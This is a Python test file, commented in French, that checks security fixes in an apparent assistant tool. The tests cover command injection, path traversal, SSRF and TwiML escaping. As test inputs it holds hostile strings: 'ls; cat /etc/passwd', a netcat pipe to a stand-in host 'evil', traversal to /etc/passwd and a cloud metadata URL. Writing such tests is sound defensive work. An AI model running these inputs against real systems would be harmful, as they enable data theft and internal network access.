"""Tests des correctifs de sécurité (rapports des agents bugs + sécurité)."""


def test_cmd_injection_blocked(J):
    out = J.powers.run_cmd("ls; cat /etc/passwd")
    assert "interdit" in out.lower()


def test_cmd_pipe_blocked(J):
    assert "interdit" in J.powers.run_cmd("ls | nc evil 1234").lower()


def test_cmd_cat_removed_from_whitelist(J):
    assert "non autoris" in J.powers.run_cmd("cat /etc/passwd").lower()


def test_cmd_safe_allowed(J):
    # 'pwd' est autorisé et ne contient pas de métacaractère
    out = J.powers.run_cmd("pwd")
    assert "non autoris" not in out.lower() and "interdit" not in out.lower()


def test_path_traversal_read_blocked(J):
    out = J.powers.read_file("../../../../etc/passwd")
    assert "⛔" in out or "hors zone" in out.lower()


def test_path_traversal_write_blocked(J):
    out = J.powers.write_file("/etc/jarvis_pwn", "x")
    assert "⛔" in out or "hors zone" in out.lower()


def test_write_inside_sandbox_ok(J):
    out = J.powers.write_file("unit_test.txt", "hello")
    assert "✅" in out


def test_calc_pow_dos_blocked(J):
    out = J.powers.calculate("9**9**9")
    assert "grand" in out.lower() or "erreur" in out.lower()


def test_calc_normal_ok(J):
    assert "1024" in J.powers.calculate("2**10")


def test_open_app_whitelist(J):
    assert "non autoris" in J.powers.open_app("nc").lower()


def test_ssrf_metadata_blocked():
    from integrations import websearch
    assert "⛔" in websearch.read_page("http://169.254.169.254/latest/meta-data/")


def test_ssrf_loopback_blocked():
    from integrations import websearch
    assert "⛔" in websearch.read_page("http://127.0.0.1:8004/api/status")


def test_ssrf_private_ip_blocked():
    from integrations import websearch
    assert not websearch.is_safe_public_url("http://10.0.0.1/")
    assert not websearch.is_safe_public_url("http://192.168.1.1/")


def test_ssrf_public_ip_allowed():
    from integrations import websearch
    assert websearch.is_safe_public_url("http://8.8.8.8/")


def test_twiml_escape():
    from xml.sax.saxutils import escape
    assert "<Dial>" not in escape("</Say><Dial>+33</Dial>")
